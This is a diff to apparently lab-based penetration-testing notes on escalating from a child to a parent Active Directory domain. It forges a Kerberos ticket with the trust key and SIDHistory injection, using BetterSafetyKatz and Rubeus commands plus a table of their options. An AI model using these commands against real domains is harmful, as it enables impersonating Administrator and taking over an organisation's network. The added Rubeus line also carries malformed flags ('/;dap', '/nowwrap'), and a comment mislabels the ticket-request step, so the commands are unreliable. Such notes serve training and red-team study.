@@ -10,7 +10,7 @@ We can see that in order to allow access to the service hosted on Domain B, a TG
 
 ## Exploitation
 
-It is possible to exploit the TGS REQ (marked red in the diagram above) by forging new TGT using the trust key.
+It is possible to exploit the TGS REQ (marked red in the diagram above) by forging new TGT using the trust key. (SIDHistory)
 
 ### Get the trust key
 
@@ -39,40 +39,30 @@ C:\AD\Tools\BetterSafetyKatz.exe "kerberos::golden /user:Administrator /domain:d
 ```
 {% endcode %}
 
-| Options                            |                                                  |
-| ---------------------------------- | ------------------------------------------------ |
-| <pre><code>/domain:
-</code></pre>  |                                                  |
-|                                    | FQDN of the current domain                       |
-| <pre><code>/sid:
-</code></pre>     |                                                  |
-|                                    | SID of the current domain                        |
-| <pre><code>/sids
-</code></pre>     |                                                  |
-|                                    | SID to be injected to the SID history            |
-| <pre><code>/rc4:
-</code></pre>     |                                                  |
-|                                    | RC4 of the trust key                             |
-| <pre><code>/krbtgt:
-</code></pre>  |                                                  |
-|                                    | krbtgt hash can be used instead of the Trust Key |
-| <pre><code>/user:
-</code></pre>    |                                                  |
-|                                    | User to impersonate                              |
-| <pre><code>/service:
-</code></pre> |                                                  |
-|                                    | Target service in the parent domain              |
-| <pre><code>/target:
-</code></pre>  |                                                  |
-|                                    | FQDN of the parent domain                        |
-| <pre><code>/ticket
-</code></pre>   |                                                  |
-|                                    | Path to save the ticket                          |
+| Options   | Description                                      |
+| --------- | ------------------------------------------------ |
+| /domain:  | FQDN of the current domain                       |
+| /sid:     | SID of the current domain                        |
+| /sids     | SID to be injected to the SID history            |
+| /rc4:     | RC4 of the trust key                             |
+| /krbtgt:  | krbtgt hash can be used instead of the Trust Key |
+| /user:    | User to impersonate                              |
+| /service: | Target service in the parent domain              |
+| /target:  | FQDN of the parent domain                        |
+| /ticket   | Path to save the ticket                          |
+
+{% code overflow="wrap" %}
+```powershell
+# Same can be done with Rubeus
+Rubeus.exe evasive-silver /service:krbtgt/dollarcorp.moneycorp.local /rc4:<hash> /sid:<sid> /sids:<sids> /;dap /user:Administrator /nowwrap
+```
+{% endcode %}
 
 ### Request the TGS and pass it
 
 {% code overflow="wrap" %}
 ```powershell
+# Forge the ticket
 Rubeus.exe asktgs /ticket:C:\AD\Tools\trust_tkt.kirbi /service:cifs/mcorp-dc.moneycorp.local /dc:mcorpdc.moneycorp.local /ptt
 ```
 {% endcode %}
